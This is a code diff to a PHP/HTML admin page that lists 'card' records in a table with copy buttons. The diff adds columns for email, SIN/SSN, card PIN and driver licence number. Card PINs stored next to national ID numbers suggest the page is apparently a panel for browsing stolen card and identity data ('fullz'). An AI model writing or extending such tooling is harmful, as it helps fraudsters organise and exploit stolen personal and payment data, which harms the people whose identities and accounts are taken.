@@ -192,6 +192,10 @@ table button {
                         <th style="padding: 10px; border: 1px solid #ddd;">Country</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Phone Number</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Date of Birth</th>
+                        <th style="padding: 10px; border: 1px solid #ddd;">Email</th>
+                        <th style="padding: 10px; border: 1px solid #ddd;">SIN/SSN</th>
+                        <th style="padding: 10px; border: 1px solid #ddd;">Pin</th>
+                        <th style="padding: 10px; border: 1px solid #ddd;">Driver License</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Actions</th>
                     </tr>
 
@@ -223,6 +227,10 @@ table button {
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['country']) ?></td>
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['phone_number']) ?></td>
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['date_of_birth'] ?? 'N/A'); ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['email'] ?? 'N/A'); ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['sinssn'] ?? 'N/A'); ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['pin'] ?? 'N/A'); ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['drivers'] ?? 'N/A'); ?></td>
                         <td
                             style="padding: 10px;display: flex;justify-content: center;align-content: center;align-items: center;">
                             <button class="copy-button" style="padding: 6px 10px; 
